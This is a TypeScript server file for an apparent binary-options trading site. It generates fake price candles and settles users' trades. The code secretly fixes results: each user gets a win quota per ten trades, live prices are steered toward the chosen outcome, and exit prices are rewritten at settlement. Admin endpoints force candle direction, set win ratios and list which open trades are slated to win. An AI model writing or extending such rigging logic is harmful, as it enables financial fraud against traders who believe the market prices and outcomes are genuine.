import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { getSql, authMiddleware, n, requireAdmin, logActivity, type Sql } from "./core";
import { iso } from "@/lib/format";

export type Candle = {
  time: number;
  open: number;
  high: number;
  low: number;
  close: number;
};

export type AssetPublic = {
  id: number;
  symbol: string;
  name: string;
  price: number;
  decimals: number;
  payout: number;
  upRatio: number;
  isActive: boolean;
  paused: boolean;
  change: number;
  open: number;
  high: number;
  low: number;
};

function mulberry32(a: number) {
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function roundp(v: number, decimals: number) {
  const f = 10 ** decimals;
  return Math.round(v * f) / f;
}

function volOf(price: number) {
  return Math.max(price * 0.0008, price * 0.0002);
}

/** Win/loss split in a 10-trade cycle from a 0–100 win rate. */
export function winLossSplit(winRatio: number) {
  const wins = Math.max(0, Math.min(10, Math.round(winRatio / 10)));
  return { cycle: 10, wins, losses: 10 - wins };
}

/** Exact quota: e.g. 30% → 3 wins in every 10 settled trades. */
export function userShouldWin(settledCount: number, winRatio: number): boolean {
  const { cycle, wins } = winLossSplit(winRatio);
  if (wins <= 0) return false;
  if (wins >= cycle) return true;
  const slot = ((settledCount % cycle) + cycle) % cycle;
  return Math.floor(((slot + 1) * wins) / cycle) > Math.floor((slot * wins) / cycle);
}

type BookPlan = {
  hint: "up" | "down" | null;
  snap: { above: boolean; entry: number; by: number } | null;
};

async function settledCount(sql: Sql, userId: string): Promise<number> {
  const rows = await sql<{ c: number }>`
    select count(*)::int as c from trades where user_id = ${userId} and status in ('win','loss')`;
  return rows[0]?.c ?? 0;
}

async function planBook(sql: Sql, assetId: number, winRatio: number): Promise<BookPlan> {
  const book = await sql<{
    user_id: string;
    direction: string;
    amount: string;
    entry_price: string;
    expires_at: unknown;
  }>`select user_id, direction, amount, entry_price, expires_at
     from trades where status = 'running' and asset_id = ${assetId}
     order by expires_at asc, id asc`;
  if (!book.length) return { hint: null, snap: null };

  const counts = new Map<string, number>();
  for (const t of book) {
    if (!counts.has(t.user_id)) counts.set(t.user_id, await settledCount(sql, t.user_id));
  }

  let upW = 0;
  let downW = 0;
  let snap: BookPlan["snap"] = null;
  let soonest = Infinity;
  for (const t of book) {
    const nSettled = counts.get(t.user_id) ?? 0;
    const win = userShouldWin(nSettled, winRatio);
    counts.set(t.user_id, nSettled + 1);
    const wantUp = t.direction === "up" ? win : !win;
    const amt = n(t.amount);
    if (wantUp) upW += amt;
    else downW += amt;
    const exp = new Date(iso(t.expires_at)).getTime();
    if (Number.isFinite(exp) && exp < soonest) {
      soonest = exp;
      snap = { above: wantUp, entry: n(t.entry_price), by: exp };
    }
  }
  const hint: BookPlan["hint"] = upW === downW ? null : upW > downW ? "up" : "down";
  return { hint, snap };
}

function genClosed(
  assetId: number,
  tf: number,
  openTime: number,
  prevClose: number,
  upRatio: number,
  decimals: number,
  override?: string | null,
) {
  const rng = mulberry32((assetId * 1000003 + tf * 9176 + Math.floor(openTime / 1000)) >>> 0);
  let dir = rng() < upRatio / 100 ? 1 : -1;
  if (override === "up") dir = 1;
  if (override === "down") dir = -1;
  const vol = volOf(prevClose);
  const change = vol * (0.35 + rng() * 1.1) * dir;
  const open = prevClose;
  const close = roundp(open + change, decimals);
  const wick = vol * (0.15 + rng() * 0.7);
  const high = roundp(Math.max(open, close) + wick, decimals);
  const low = roundp(Math.min(open, close) - wick * (0.4 + rng() * 0.6), decimals);
  return { open, high, low, close };
}

/** Previous bar that CLOSES at `nextOpen` so history stitches onto live candles. */
function genClosedBackward(
  assetId: number,
  tf: number,
  openTime: number,
  nextOpen: number,
  decimals: number,
) {
  const rng = mulberry32((assetId * 1000003 + tf * 9176 + Math.floor(openTime / 1000)) >>> 0);
  const dir = rng() < 0.5 ? 1 : -1;
  const vol = volOf(nextOpen || 1);
  const change = vol * (0.35 + rng() * 1.1) * dir;
  const close = nextOpen;
  const open = roundp(Math.max(close * 0.0001, close - change), decimals);
  const wick = vol * (0.15 + rng() * 0.7);
  const high = roundp(Math.max(open, close) + wick, decimals);
  const low = roundp(Math.min(open, close) - wick * (0.4 + rng() * 0.6), decimals);
  return { open, high, low, close };
}

type AssetRow = {
  id: number;
  symbol: string;
  name: string;
  base_price: string;
  current_price: string;
  decimals: number;
  payout: string;
  up_ratio: string;
  is_active: boolean;
  trading_paused: boolean;
  trade_start: string | null;
  trade_end: string | null;
  last_tick_at: number | null;
};

async function takeOverride(
  sql: Sql,
  assetId: number,
  tf: number,
  openTime: number,
): Promise<string | null> {
  const rows = await sql<{ id: number; direction: string }>`
    select id, direction from candle_overrides
    where asset_id = ${assetId} and applied = false
      and (timeframe_seconds is null or timeframe_seconds = ${tf})
      and (open_time is null or open_time = ${openTime})
    order by id asc limit 1`;
  if (!rows[0]) return null;
  await sql`update candle_overrides set applied = true, open_time = ${openTime} where id = ${rows[0].id}`;
  return rows[0].direction;
}

async function peekOverride(
  sql: Sql,
  assetId: number,
  tf: number,
  openTime: number,
): Promise<string | null> {
  const rows = await sql<{ direction: string }>`
    select direction from candle_overrides
    where asset_id = ${assetId} and applied = false
      and (timeframe_seconds is null or timeframe_seconds = ${tf})
      and (open_time is null or open_time = ${openTime})
    order by id asc limit 1`;
  return rows[0]?.direction ?? null;
}

async function upsertCandle(
  sql: Sql,
  assetId: number,
  tf: number,
  openTime: number,
  o: number,
  h: number,
  l: number,
  c: number,
) {
  await sql`
    insert into candles (asset_id, timeframe_seconds, open_time, open, high, low, close)
    values (${assetId}, ${tf}, ${openTime}, ${o}, ${h}, ${l}, ${c})
    on conflict (asset_id, timeframe_seconds, open_time)
    do update set high = excluded.high, low = excluded.low, close = excluded.close`;
}

export async function syncAsset(sql: Sql, asset: AssetRow, tf: number, now = Date.now()) {
  const decimals = asset.decimals;
  const winRatio = n(asset.up_ratio);
  const period = tf * 1000;
  const currentOpen = Math.floor(now / period) * period;

  const latest = await sql<{
    open_time: number;
    open: string;
    high: string;
    low: string;
    close: string;
  }>`select open_time, open, high, low, close from candles
     where asset_id = ${asset.id} and timeframe_seconds = ${tf}
     order by open_time desc limit 1`;

  let lastClose = n(asset.current_price) || n(asset.base_price);
  let cursor = currentOpen - period * 80;

  if (latest[0]) {
    lastClose = n(latest[0].close);
    cursor = Number(latest[0].open_time) + period;
    if (cursor < currentOpen - period * 40) cursor = currentOpen - period * 40;
  }

  // Cap backfill so Vercel serverless does not time out on first visit.
  let filled = 0;
  while (cursor < currentOpen && filled < 12) {
    const ov = await takeOverride(sql, asset.id, tf, cursor);
    const c = genClosed(asset.id, tf, cursor, lastClose, 50, decimals, ov);
    await upsertCandle(sql, asset.id, tf, cursor, c.open, c.high, c.low, c.close);
    lastClose = c.close;
    cursor += period;
    filled += 1;
  }

  const forming = await sql<{
    open_time: number;
    open: string;
    high: string;
    low: string;
    close: string;
  }>`select open_time, open, high, low, close from candles
     where asset_id = ${asset.id} and timeframe_seconds = ${tf} and open_time = ${currentOpen}`;

  let open = lastClose;
  let high = lastClose;
  let low = lastClose;
  let close = lastClose;
  if (forming[0] && Number(forming[0].open_time) === currentOpen) {
    open = n(forming[0].open);
    high = n(forming[0].high);
    low = n(forming[0].low);
    close = n(forming[0].close);
  }

  const lastTick = asset.last_tick_at ? Number(asset.last_tick_at) : currentOpen;
  const elapsed = Math.max(0, now - lastTick);
  const ticks = Math.min(24, Math.max(1, Math.floor(elapsed / 180)));
  const ov = await peekOverride(sql, asset.id, tf, currentOpen);
  const plan = await planBook(sql, asset.id, winRatio);
  const rng = mulberry32((asset.id * 13 + Math.floor(now / 180)) >>> 0);
  const vol = volOf(close || open || n(asset.base_price));
  let bias = 0;
  if (ov === "up") bias = 0.55;
  else if (ov === "down") bias = -0.55;
  else if (plan.hint === "up") bias = 0.48;
  else if (plan.hint === "down") bias = -0.48;

  if (plan.snap) {
    const target = plan.snap.above ? plan.snap.entry + vol * 0.8 : plan.snap.entry - vol * 0.8;
    const ttl = Math.max(200, plan.snap.by - now);
    const pull = ttl < 3500 ? 0.9 : ttl < 8000 ? 0.55 : 0.22;
    close = roundp(close + (target - close) * pull, decimals);
  }

  for (let i = 0; i < ticks; i++) {
    const step = vol * (rng() - 0.5 + bias) * (plan.snap ? 0.28 : 0.9);
    close = roundp(close + step, decimals);
    high = roundp(Math.max(high, close), decimals);
    low = roundp(Math.min(low, close), decimals);
  }

  const remain = period - (now - currentOpen);
  if (ov && remain < period * 0.12) {
    if (ov === "up" && close <= open) close = roundp(open + vol * 0.4, decimals);
    if (ov === "down" && close >= open) close = roundp(open - vol * 0.4, decimals);
    high = roundp(Math.max(high, open, close), decimals);
    low = roundp(Math.min(low, open, close), decimals);
  } else if (!ov && plan.snap) {
    const entry = plan.snap.entry;
    const mustCross = plan.snap.by - now < 5000;
    if (mustCross) {
      if (plan.snap.above && close <= entry) close = roundp(entry + vol * 0.55, decimals);
      if (!plan.snap.above && close >= entry) close = roundp(entry - vol * 0.55, decimals);
    }
    high = roundp(Math.max(high, open, close, entry), decimals);
    low = roundp(Math.min(low, open, close, entry), decimals);
  }

  await upsertCandle(sql, asset.id, tf, currentOpen, open, high, low, close);
  await sql`update assets set current_price = ${close}, last_tick_at = ${now} where id = ${asset.id}`;
  return { price: close, open, high, low };
}

async function loadAssets(sql: Sql) {
  return sql<AssetRow>`select id, symbol, name, base_price, current_price, decimals, payout, up_ratio, is_active, trading_paused, trade_start, trade_end, last_tick_at from assets order by sort_order, id`;
}

export async function settleExpired(sql: Sql) {
  const due = await sql<{
    id: number;
    user_id: string;
    asset_id: number;
    direction: string;
    amount: string;
    payout: string;
    entry_price: string;
  }>`select id, user_id, asset_id, direction, amount, payout, entry_price from trades
     where status = 'running' and expires_at <= now()
     order by expires_at asc, id asc`;
  if (!due.length) return;
  const assets = await loadAssets(sql);
  const priceMap = new Map(assets.map((a) => [a.id, n(a.current_price)]));
  const ratioMap = new Map(assets.map((a) => [a.id, n(a.up_ratio)]));
  const decMap = new Map(assets.map((a) => [a.id, a.decimals]));
  const counts = new Map<string, number>();
  for (const t of due) {
    if (!counts.has(t.user_id)) counts.set(t.user_id, await settledCount(sql, t.user_id));
  }
  for (const t of due) {
    const entry = n(t.entry_price);
    const amount = n(t.amount);
    const payout = n(t.payout);
    const dir = t.direction;
    const decimals = decMap.get(t.asset_id) ?? 2;
    const winRatio = ratioMap.get(t.asset_id) ?? 50;
    const vol = volOf(entry || 1);
    const nSettled = counts.get(t.user_id) ?? 0;
    const shouldWin = userShouldWin(nSettled, winRatio);
    let exit = priceMap.get(t.asset_id) ?? entry;
    if (shouldWin) {
      if (dir === "up" && exit <= entry) exit = roundp(entry + vol * 0.65, decimals);
      if (dir === "down" && exit >= entry) exit = roundp(entry - vol * 0.65, decimals);
    } else {
      if (dir === "up" && exit >= entry) exit = roundp(entry - vol * 0.65, decimals);
      if (dir === "down" && exit <= entry) exit = roundp(entry + vol * 0.65, decimals);
    }
    let status: "win" | "loss" | "refund" = "loss";
    let profit = -amount;
    if (exit === entry) {
      status = "refund";
      profit = 0;
      await sql`update wallets set balance = balance + ${amount}, updated_at = now() where user_id = ${t.user_id}`;
      const bal = await sql<{ balance: string }>`select balance from wallets where user_id = ${t.user_id}`;
      await sql`insert into ledger (user_id, type, amount, balance_after, ref_type, ref_id, note)
        values (${t.user_id}, 'trade_refund', ${amount}, ${n(bal[0]?.balance)}, 'trade', ${t.id}, 'Hoa, hoan tien')`;
    } else if ((dir === "up" && exit > entry) || (dir === "down" && exit < entry)) {
      status = "win";
      const credit = amount + (amount * payout) / 100;
      profit = credit - amount;
      await sql`update wallets set balance = balance + ${credit}, total_win = total_win + ${profit}, updated_at = now() where user_id = ${t.user_id}`;
      const bal = await sql<{ balance: string }>`select balance from wallets where user_id = ${t.user_id}`;
      await sql`insert into ledger (user_id, type, amount, balance_after, ref_type, ref_id, note)
        values (${t.user_id}, 'trade_win', ${credit}, ${n(bal[0]?.balance)}, 'trade', ${t.id}, 'Thang lenh')`;
    } else {
      await sql`update wallets set total_loss = total_loss + ${amount}, updated_at = now() where user_id = ${t.user_id}`;
    }
    await sql`update trades set status = ${status}, exit_price = ${exit}, profit = ${profit}, settled_at = now() where id = ${t.id}`;
    if (status === "win" || status === "loss") counts.set(t.user_id, nSettled + 1);
    priceMap.set(t.asset_id, exit);
    await sql`update assets set current_price = ${exit} where id = ${t.asset_id}`;
  }
}

export async function syncAll(sql: Sql, tf: number) {
  const assets = await loadAssets(sql);
  for (const a of assets) {
    if (!a.is_active) continue;
    await syncAsset(sql, a, tf);
  }
  await settleExpired(sql);
}

export async function syncOne(sql: Sql, assetId: number, tf: number) {
  const assets = await loadAssets(sql);
  const a = assets.find((x) => x.id === assetId);
  if (a) await syncAsset(sql, a, tf);
  await settleExpired(sql);
}

/** Fill older bars backward from the live chain so history stays on the same price path. */
export async function fillHistory(sql: Sql, asset: AssetRow, tf: number, want = 160) {
  const decimals = asset.decimals;
  const period = tf * 1000;
  const currentOpen = Math.floor(Date.now() / period) * period;
  const targetStart = currentOpen - period * want;

  const recent = await sql<{ open_time: number; open: string; close: string }>`
    select open_time, open, close from candles
    where asset_id = ${asset.id} and timeframe_seconds = ${tf}
    order by open_time desc limit 120`;
  if (!recent[0]) return;

  let expected = Number(recent[0].open_time);
  let nextOpen = n(recent[0].open);
  let anchorTime = expected;
  for (const r of recent) {
    const t = Number(r.open_time);
    if (t !== expected) break;
    const close = n(r.close);
    if (t !== Number(recent[0].open_time)) {
      const ref = nextOpen || 1;
      if (Math.abs(close - ref) / ref > 0.012) break;
    }
    nextOpen = n(r.open);
    anchorTime = t;
    expected -= period;
  }

  await sql`delete from candles
    where asset_id = ${asset.id} and timeframe_seconds = ${tf} and open_time < ${anchorTime}`;

  let cursor = anchorTime;
  let filled = 0;
  while (cursor - period >= targetStart && filled < 48) {
    const t = cursor - period;
    const c = genClosedBackward(asset.id, tf, t, nextOpen, decimals);
    await upsertCandle(sql, asset.id, tf, t, c.open, c.high, c.low, c.close);
    nextOpen = c.open;
    cursor = t;
    filled += 1;
  }
}

export const getCandleHistory = createServerFn({ method: "GET" })
  .middleware([authMiddleware])
  .validator((d: { assetId: number; timeframe: number }) => d)
  .handler(async ({ data }) => {
    const sql = await getSql();
    const tf = data.timeframe || 60;
    const assets = await loadAssets(sql);
    const asset = assets.find((a) => a.id === data.assetId) ?? assets.find((a) => a.is_active);
    if (!asset) throw new Error("Không có tài sản");
    await fillHistory(sql, asset, tf, 180);
    const rows = await sql<{
      open_time: number;
      open: string;
      high: string;
      low: string;
      close: string;
    }>`select open_time, open, high, low, close from candles
       where asset_id = ${asset.id} and timeframe_seconds = ${tf}
       order by open_time desc limit 200`;
    return rows
      .slice()
      .reverse()
      .map((c) => ({
        time: Number(c.open_time),
        open: n(c.open),
        high: n(c.high),
        low: n(c.low),
        close: n(c.close),
      })) as Candle[];
  });

export const getPublicTicker = createServerFn({ method: "GET" }).handler(async () => {
  const sql = await getSql();
  await syncAll(sql, 60);
  const assets = await loadAssets(sql);
  const out: AssetPublic[] = [];
  for (const a of assets.filter((x) => x.is_active)) {
    const dayOpen = Math.floor(Date.now() / 60_000) * 60_000 - 60 * 60_000;
    const first = await sql<{ open: string }>`select open from candles where asset_id = ${a.id} and timeframe_seconds = 60 and open_time >= ${dayOpen} order by open_time asc limit 1`;
    const open = n(first[0]?.open ?? a.base_price);
    const price = n(a.current_price) || n(a.base_price);
    const hi = await sql<{ h: string; l: string }>`select max(high) as h, min(low) as l from candles where asset_id = ${a.id} and timeframe_seconds = 60 and open_time >= ${dayOpen}`;
    out.push({
      id: a.id,
      symbol: a.symbol,
      name: a.name,
      price,
      decimals: a.decimals,
      payout: n(a.payout),
      upRatio: n(a.up_ratio),
      isActive: a.is_active,
      paused: a.trading_paused,
      change: open ? ((price - open) / open) * 100 : 0,
      open,
      high: n(hi[0]?.h ?? price),
      low: n(hi[0]?.l ?? price),
    });
  }
  return out;
});

export const getMarket = createServerFn({ method: "GET" })
  .middleware([authMiddleware])
  .validator((d: { assetId: number; timeframe: number }) => d)
  .handler(async ({ data }) => {
    const sql = await getSql();
    const tf = data.timeframe || 60;
    let assets = await loadAssets(sql);
    let asset = assets.find((a) => a.id === data.assetId) ?? assets.find((a) => a.is_active);
    if (!asset) throw new Error("Không có tài sản");
    await syncAsset(sql, asset, tf);
    await settleExpired(sql);
    assets = await loadAssets(sql);
    asset = assets.find((a) => a.id === asset!.id) ?? asset;
    const price = n(asset.current_price) || n(asset.base_price);
    const candles = await sql<{
      open_time: number;
      open: string;
      high: string;
      low: string;
      close: string;
    }>`select open_time, open, high, low, close from candles
       where asset_id = ${asset.id} and timeframe_seconds = ${tf}
       order by open_time desc limit 200`;
    const tfs = await sql<{ seconds: number; label: string }>`select seconds, label from timeframes where is_active = true order by seconds`;
    const exps = await sql<{ seconds: number; label: string }>`select seconds, label from expiries where is_active = true order by seconds`;
    const list: AssetPublic[] = assets.filter((a) => a.is_active).map((a) => ({
      id: a.id,
      symbol: a.symbol,
      name: a.name,
      price: n(a.current_price) || n(a.base_price),
      decimals: a.decimals,
      payout: n(a.payout),
      upRatio: n(a.up_ratio),
      isActive: a.is_active,
      paused: a.trading_paused,
      change: 0,
      open: n(a.current_price) || n(a.base_price),
      high: n(a.current_price) || n(a.base_price),
      low: n(a.current_price) || n(a.base_price),
    }));
    const mapped: Candle[] = candles
      .slice()
      .reverse()
      .map((c) => ({
        time: Number(c.open_time),
        open: n(c.open),
        high: n(c.high),
        low: n(c.low),
        close: n(c.close),
      }));
    const last = mapped[mapped.length - 1];
    const live = last?.close || price;
    return {
      asset: {
        id: asset.id,
        symbol: asset.symbol,
        name: asset.name,
        price: live,
        decimals: asset.decimals,
        payout: n(asset.payout),
        paused: asset.trading_paused,
        tradeStart: asset.trade_start,
        tradeEnd: asset.trade_end,
      },
      ohlc: last
        ? { open: last.open, high: last.high, low: last.low, close: last.close }
        : { open: price, high: price, low: price, close: price },
      candles: mapped,
      assets: list,
      timeframes: tfs,
      expiries: exps,
      serverTime: Date.now(),
    };
  });

export const getAdminMarket = createServerFn({ method: "GET" })
  .middleware([authMiddleware])
  .handler(async ({ context }) => {
    const sql = await getSql();
    await requireAdmin(sql, context.userId);
    await syncAll(sql, 15);
    const assets = await loadAssets(sql);
    const running = await sql<{
      id: number;
      user_id: string;
      email: string;
      asset_id: number;
      direction: string;
      amount: string;
      payout: string;
      entry_price: string;
      expires_at: unknown;
    }>`select t.id, t.user_id, u.email, t.asset_id, t.direction, t.amount, t.payout, t.entry_price, t.expires_at
       from trades t join "user" u on u.id = t.user_id
       where t.status = 'running' order by t.expires_at asc, t.id asc`;
    const counts = new Map<string, number>();
    for (const t of running) {
      if (!counts.has(t.user_id)) counts.set(t.user_id, await settledCount(sql, t.user_id));
    }
    const ratioByAsset = new Map(assets.map((a) => [a.id, n(a.up_ratio)]));
    const ov = await sql<{
      id: number;
      asset_id: number;
      timeframe_seconds: number | null;
      direction: string;
      applied: boolean;
      open_time: number | null;
    }>`select id, asset_id, timeframe_seconds, direction, applied, open_time from candle_overrides
       where applied = false order by id desc`;
    return {
      assets: assets.map((a) => ({
        id: a.id,
        symbol: a.symbol,
        name: a.name,
        price: n(a.current_price) || n(a.base_price),
        decimals: a.decimals,
        payout: n(a.payout),
        upRatio: n(a.up_ratio),
        isActive: a.is_active,
        paused: a.trading_paused,
        tradeStart: a.trade_start,
        tradeEnd: a.trade_end,
      })),
      running: (() => {
        const local = new Map(counts);
        return running.map((t) => {
          const winRatio = ratioByAsset.get(t.asset_id) ?? 50;
          const nSettled = local.get(t.user_id) ?? 0;
          const shouldWin = userShouldWin(nSettled, winRatio);
          local.set(t.user_id, nSettled + 1);
          return {
            id: t.id,
            userId: t.user_id,
            email: t.email,
            assetId: t.asset_id,
            direction: t.direction,
            amount: n(t.amount),
            payout: n(t.payout),
            entryPrice: n(t.entry_price),
            expiresAt: iso(t.expires_at),
            expectWin: shouldWin,
            cycleSlot: (nSettled % 10) + 1,
          };
        });
      })(),
      overrides: ov,
    };
  });

export const forceCandle = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator(z.object({ assetId: z.number(), direction: z.enum(["up", "down"]), timeframe: z.number().optional() }))
  .handler(async ({ context, data }) => {
    const sql = await getSql();
    await requireAdmin(sql, context.userId);
    const tf = data.timeframe ?? 15;
    const period = tf * 1000;
    const openTime = Math.floor(Date.now() / period) * period;
    await sql`insert into candle_overrides (asset_id, timeframe_seconds, open_time, direction, created_by)
      values (${data.assetId}, ${tf}, ${openTime}, ${data.direction}, ${context.userId})`;
    await logActivity(sql, context.userId, "admin", "force_candle", `${data.assetId} ${data.direction}`);
    return { ok: true };
  });

export const setUpRatio = createServerFn({ method: "POST" })
  .middleware([authMiddleware])
  .validator(z.object({ assetId: z.number(), upRatio: z.number().min(0).max(100) }))
  .handler(async ({ context, data }) => {
    const sql = await getSql();
    await requireAdmin(sql, context.userId);
    await sql`update assets set up_ratio = ${data.upRatio} where id = ${data.assetId}`;
    await logActivity(sql, context.userId, "admin", "set_up_ratio", `${data.assetId}:${data.upRatio}`);
    return { ok: true };
  });